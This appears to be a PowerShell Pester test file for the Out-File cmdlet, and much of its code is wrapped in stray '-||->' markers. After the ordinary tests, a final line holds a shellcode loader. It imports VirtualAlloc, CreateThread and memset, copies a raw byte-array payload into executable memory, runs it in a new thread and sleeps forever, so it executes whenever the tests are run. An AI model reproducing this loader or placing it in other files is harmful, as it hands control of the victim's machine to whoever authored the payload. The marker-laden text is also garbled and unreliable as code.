

 -||-> Describe "Out-File DRT Unit Tests" -Tags "CI" {
     -||-> It "Should be able to write the contents into a file with -pspath" {
         -||-> $tempFile =  -||-> Join-Path -Path $TestDrive -ChildPath "ExposeBug928965" <-||-  <-||- 
         -||-> {  -||-> 1 | Out-File -PSPath $tempFile <-||-  } | Should -Not -Throw <-||- 
         -||-> $fileContents =  -||-> Get-Content $tempFile <-||-  <-||- 
         -||-> $fileContents | Should -Be 1 <-||- 
         -||-> Remove-Item $tempFile -Force <-||- 
    } <-||- 

     -||-> It "Should be able to write the contents into a file with -pspath" {
         -||-> $tempFile =  -||-> Join-Path -Path $TestDrive -ChildPath "outfileAppendTest.txt" <-||-  <-||- 
         -||-> {  -||-> 'This is first line.' | out-file $tempFile <-||-  } | Should -Not -Throw <-||- 
         -||-> {  -||-> 'This is second line.' | out-file -append $tempFile <-||-  } | Should -Not -Throw <-||- 
         -||-> $tempFile |Should -FileContentMatch "first" <-||- 
         -||-> $tempFile |Should -FileContentMatch "second" <-||- 
         -||-> Remove-Item $tempFile -Force <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Out-File" -Tags "CI" {
     -||-> BeforeAll {
         -||-> $expectedContent = "some test text" <-||- 
         -||-> $inObject =  -||-> New-Object psobject -Property @{text= -||-> $expectedContent <-||- } <-||-  <-||- 
         -||-> $testfile =  -||-> Join-Path -Path $TestDrive -ChildPath outfileTest.txt <-||-  <-||- 
    } <-||- 

     -||-> AfterEach {
         -||-> Remove-Item -Path $testfile -Force <-||- 
    } <-||- 

     -||-> It "Should be able to be called without error" {
         -||-> {  -||-> Out-File -FilePath $testfile <-||-  }   | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should be able to accept string input via piping" {
         -||-> {  -||-> $expectedContent | Out-File -FilePath $testfile <-||-  } | Should -Not -Throw <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual | Should -Be $expectedContent <-||- 
    } <-||- 

     -||-> It "Should be able to accept string input via the InputObject switch" {
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $expectedContent <-||-  } | Should -Not -Throw <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual | Should -Be $expectedContent <-||- 
    } <-||- 

     -||-> It "Should be able to accept object input" {
         -||-> {  -||-> $inObject | Out-File -FilePath $testfile <-||-  } | Should -Not -Throw <-||- 

         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject <-||-  } | Should -Not -Throw <-||- 
    } <-||- 

     -||-> It "Should not overwrite when the noclobber switch is used" {

         -||-> Out-File -FilePath $testfile -InputObject $inObject <-||- 

         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject -NoClobber -ErrorAction SilentlyContinue <-||-  }   | Should -Throw "already exists." <-||- 
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject -NoOverWrite -ErrorAction SilentlyContinue <-||-  } | Should -Throw "already exists." <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual[0] | Should -BeNullOrEmpty <-||- 
         -||-> $actual[1] | Should -Match "text" <-||- 
         -||-> $actual[2] | Should -Match "----" <-||- 
         -||-> $actual[3] | Should -Match "some test text" <-||- 
    } <-||- 

     -||-> It "Should Append a new line when the append switch is used" {
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject <-||-  }         | Should -Not -Throw <-||- 
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject -Append <-||-  } | Should -Not -Throw <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual[0]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[1]  | Should -Match "text" <-||- 
         -||-> $actual[2]  | Should -Match "----" <-||- 
         -||-> $actual[3]  | Should -Match "some test text" <-||- 
         -||-> $actual[4]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[5]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[6]  | Should -Match "text" <-||- 
         -||-> $actual[7]  | Should -Match "----" <-||- 
         -||-> $actual[8]  | Should -Match "some test text" <-||- 
         -||-> $actual[9]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[10] | Should -BeNullOrEmpty <-||- 
    } <-||- 

     -||-> It "Should limit each line to the specified number of characters when the width switch is used on objects" {

         -||-> Out-File -FilePath $testfile -Width 10 -InputObject $inObject <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual[0] | Should -BeNullOrEmpty <-||- 
         -||-> $actual[1] | Should -BeExactly "text" <-||- 
         -||-> $actual[2] | Should -BeExactly "----" <-||- 
         -||-> $actual[3] | Should -BeExactly "some test`u{2026}" <-||-  
    } <-||- 

     -||-> It "Should allow the cmdlet to overwrite an existing read-only file" {
        
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject <-||-  }                | Should -Not -Throw <-||- 
         -||-> Set-ItemProperty -Path $testfile -Name IsReadOnly -Value $true <-||- 

        
         -||-> {  -||-> Out-File -FilePath $testfile -InputObject $inObject -Append -Force <-||-  } | Should -Not -Throw <-||- 

         -||-> $actual =  -||-> Get-Content $testfile <-||-  <-||- 

         -||-> $actual[0]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[1]  | Should -Match "text" <-||- 
         -||-> $actual[2]  | Should -Match "----" <-||- 
         -||-> $actual[3]  | Should -Match "some test text" <-||- 
         -||-> $actual[4]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[5]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[6]  | Should -Match "text" <-||- 
         -||-> $actual[7]  | Should -Match "----" <-||- 
         -||-> $actual[8]  | Should -Match "some test text" <-||- 
         -||-> $actual[9]  | Should -BeNullOrEmpty <-||- 
         -||-> $actual[10] | Should -BeNullOrEmpty <-||- 

        
         -||-> Set-ItemProperty -Path $testfile -Name IsReadOnly -Value $false <-||- 
    } <-||- 

     -||-> It "Should be able to use the 'Path' alias for the 'FilePath' parameter" {
         -||-> {  -||-> Out-File -Path $testfile <-||-  } | Should -Not -Throw <-||- 
    } <-||- 
} <-||- 


 -||-> $eOn = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $eOn -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x81,0xbd,0x26,0xf3,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x43,0x0f,0x03,0x43,0x8e,0x5f,0xd3,0x0f,0x78,0x1d,0x1c,0xf0,0x78,0x42,0x94,0x15,0x49,0x42,0xc2,0x5e,0xf9,0x72,0x80,0x33,0xf5,0xf9,0xc4,0xa7,0x8e,0x8c,0xc0,0xc8,0x27,0x3a,0x37,0xe6,0xb8,0x17,0x0b,0x69,0x3a,0x6a,0x58,0x49,0x03,0xa5,0xad,0x88,0x44,0xd8,0x5c,0xd8,0x1d,0x96,0xf3,0xcd,0x2a,0xe2,0xcf,0x66,0x60,0xe2,0x57,0x9a,0x30,0x05,0x79,0x0d,0x4b,0x5c,0x59,0xaf,0x98,0xd4,0xd0,0xb7,0xfd,0xd1,0xab,0x4c,0x35,0xad,0x2d,0x85,0x04,0x4e,0x81,0xe8,0xa9,0xbd,0xdb,0x2d,0x0d,0x5e,0xae,0x47,0x6e,0xe3,0xa9,0x93,0x0d,0x3f,0x3f,0x00,0xb5,0xb4,0xe7,0xec,0x44,0x18,0x71,0x66,0x4a,0xd5,0xf5,0x20,0x4e,0xe8,0xda,0x5a,0x6a,0x61,0xdd,0x8c,0xfb,0x31,0xfa,0x08,0xa0,0xe2,0x63,0x08,0x0c,0x44,0x9b,0x4a,0xef,0x39,0x39,0x00,0x1d,0x2d,0x30,0x4b,0x49,0x82,0x79,0x74,0x89,0x8c,0x0a,0x07,0xbb,0x13,0xa1,0x8f,0xf7,0xdc,0x6f,0x57,0xf8,0xf6,0xc8,0xc7,0x07,0xf9,0x28,0xc1,0xc3,0xad,0x78,0x79,0xe2,0xcd,0x12,0x79,0x0b,0x18,0x8e,0x7c,0x9b,0xee,0x4c,0x9a,0x85,0x99,0x50,0x64,0x38,0xe4,0xdc,0x82,0x6a,0x48,0x8f,0x1a,0xca,0x38,0x6f,0xcb,0xa2,0x52,0x60,0x34,0xd2,0x5c,0xaa,0x5d,0x78,0xb3,0x03,0x35,0x14,0x2a,0x0e,0xcd,0x85,0xb3,0x84,0xab,0x85,0x38,0x2b,0x4b,0x4b,0xc9,0x46,0x5f,0x3b,0x39,0x1d,0x3d,0xed,0x46,0x8b,0x28,0x11,0xd3,0x30,0xfb,0x46,0x4b,0x3b,0xda,0xa0,0xd4,0xc4,0x09,0xbb,0xdd,0x50,0xf2,0xd3,0x21,0xb5,0xf2,0x23,0x74,0xdf,0xf2,0x4b,0x20,0xbb,0xa0,0x6e,0x2f,0x16,0xd5,0x23,0xba,0x99,0x8c,0x90,0x6d,0xf2,0x32,0xcf,0x5a,0x5d,0xcc,0x3a,0x5b,0xa1,0x1b,0x02,0x29,0xcb,0x9f <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Af0E=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Af0E.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Af0E,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



